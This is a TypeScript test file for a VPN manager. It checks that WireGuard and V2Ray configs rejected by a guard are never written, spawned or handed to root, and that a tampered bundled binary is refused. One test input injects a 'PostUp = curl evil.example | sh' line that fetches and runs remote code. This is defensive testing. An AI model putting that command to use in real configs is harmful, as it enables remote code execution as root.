import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { loadModule, type ModuleHarness } from '../../../test/harness/module.ts'

// vpn-manager is where node-supplied config meets root and the user's process table.
// These pin the order at its sinks (docs/invariants/node-trust.md [NT-1],
// reliability.md [REL-7], packaging.md [PKG-1]): pin the endpoint, guard the config,
// and only then write it or hand it to root; a bundled binary that fails its pin is
// refused, never swapped for whatever is on PATH.

const vm = await loadModule({
  entries: ['src/main/vpn/vpn-manager.ts'],
  fake: ['src/main/helper/privileged'],
  stubs: { child_process: 'test/harness/child-process.ts' },
})

// wg-quick and v2ray "installed": executables in a temp dir put first on PATH.
const bin = mkdtempSync(join(tmpdir(), 'kv-bin-'))
const resources = mkdtempSync(join(tmpdir(), 'kv-resources-'))
const savedPath = process.env.PATH
const ownTmp = new Set(readdirSync(tmpdir()))
before(() => {
  for (const name of ['wg-quick', 'v2ray']) {
    writeFileSync(join(bin, name), '#!/bin/sh\n')
    chmodSync(join(bin, name), 0o755)
  }
  process.env.PATH = `${bin}:${savedPath}`
  ;(process as { resourcesPath?: string }).resourcesPath = resources
})
after(() => {
  process.env.PATH = savedPath
  rmSync(bin, { recursive: true, force: true })
  rmSync(resources, { recursive: true, force: true })
  // vpn-manager makes its own private temp dir at import, once per fresh instance.
  for (const d of readdirSync(tmpdir())) if (d.startsWith('katacomb-vpn-') && !ownTmp.has(d)) rmSync(join(tmpdir(), d), { recursive: true, force: true })
})

const CLEAN_WG = (endpoint: string) => [
  '[Interface]', 'PrivateKey = aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd28=', 'Address = 10.8.0.2/32', '',
  '[Peer]', 'PublicKey = aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd28=', 'AllowedIPs = 0.0.0.0/0', `Endpoint = ${endpoint}`, '',
].join('\n')

function fresh(): ModuleHarness & { privileged: string[][] } {
  const privileged: string[][] = []
  const h = vm.fresh({
    'helper/privileged': { runPrivileged: async (a: string[]) => { privileged.push(a) } },
    child_process: {
      // No interface exists yet; getent resolves wg.example to a documentation address.
      execSync: () => { throw new Error('Device "sntl0" does not exist.') },
      execFileSync: (cmd: string, args: string[]) => {
        if (cmd === 'getent' && args[1] === 'wg.example') return Buffer.from('198.51.100.5    STREAM wg.example\n')
        throw new Error(`unexpected ${cmd}`)
      },
      spawn: () => { throw new Error('nothing may be spawned in these tests') },
    },
  })
  return Object.assign(h, { privileged })
}

type Connect = (cfg: string, ...rest: unknown[]) => unknown

test('[NT-1] a WireGuard config the guard rejects never reaches root or the disk', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  const evil = CLEAN_WG('203.0.113.7:51820').replace('[Peer]', 'PostUp = curl evil.example | sh\n\n[Peer]')
  await assert.rejects(async () => (h.mod.connectWireGuardFromConfig as Connect)(evil))
  assert.deepEqual(h.privileged, [])
  const leftovers = readdirSync(tmpdir()).filter((d) => d.startsWith('katacomb-vpn-') && !ownTmp.has(d))
    .filter((d) => existsSync(join(tmpdir(), d, 'sntl0.conf')))
  assert.deepEqual(leftovers, [], 'the rejected config was never written')
})

test('[REL-7] [NT-1] control: a clean config is pinned to IPv4 first, then written 0600 and handed to root', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  await (h.mod.connectWireGuardFromConfig as Connect)(CLEAN_WG('wg.example:51820'))
  assert.equal(h.privileged.length, 1)
  const [verb, file] = h.privileged[0]
  assert.equal(verb, 'up')
  assert.match(readFileSync(file, 'utf-8'), /^Endpoint = 198\.51\.100\.5:51820$/m, 'root sees the pinned IP, never the hostname')
  assert.equal(statSync(file).mode & 0o777, 0o600)
})

test('[NT-1] a V2Ray config the guard rejects is never written or spawned', (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  // A SOCKS inbound on every interface would open the user's tunnel to the LAN.
  const cfg = JSON.stringify({
    inbounds: [{ protocol: 'socks', listen: '0.0.0.0', port: 1080 }],
    outbounds: [{ protocol: 'vmess', settings: { vnext: [{ address: '203.0.113.7', port: 443 }] } }],
  })
  assert.throws(() => (h.mod.connectV2RayFromConfig as Connect)(cfg))
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})

test('[PKG-1] a bundled core that fails its pin is refused, never swapped for the one on PATH', (t) => {
  mkdirSync(join(resources, 'linux/bin'), { recursive: true })
  writeFileSync(join(resources, 'linux/bin/v2ray'), 'tampered')
  t.after(() => rmSync(join(resources, 'linux'), { recursive: true, force: true }))
  const h = fresh()
  t.after(() => h.dispose())
  assert.throws(() => (h.mod.connectV2RayFromConfig as Connect)('{}'), /integrity/)
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})
